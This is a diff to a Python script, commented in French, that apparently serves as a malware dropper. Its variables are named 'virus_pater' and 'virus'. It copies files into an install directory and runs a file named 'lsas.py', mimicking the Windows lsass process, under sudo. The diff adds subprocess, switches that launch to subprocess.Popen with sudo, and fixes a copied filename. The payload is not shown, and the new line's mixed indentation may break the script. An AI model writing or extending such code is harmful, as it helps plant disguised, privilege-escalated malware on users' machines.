@@ -1,4 +1,5 @@
 import os
+import subprocess
 from sys import platform
 
 user = os.path.expanduser('~')
@@ -14,7 +15,6 @@ else:
 	user = "/tmp"
 
 virus_pater = open('main.py', 'r')
-virus = virus_pater.readlines()
 
 #Détecte le chemin d'installation en fonction du système d'exploitation.
 if platform == 'win32' :
@@ -47,7 +47,7 @@ with open('config.json', 'r') as file :
 
 # Copie du fichier sauvegarde_locale.py
 with open('sauvegarde_locale.py', 'r') as file :
-    with open(installpath + 'sauvegarde_local.py', 'w') as copy :
+    with open(installpath + 'sauvegarde_locale.py', 'w') as copy :
         copy.writelines(file.readlines())
 
 
@@ -56,4 +56,5 @@ file = installpath + 'lsas.py'
 if platform == "win32":
     os.system('python ' + file)
 else:
-    os.system('sudo python ' + file)
+		subprocess.Popen(["sudo", "python", file])
+
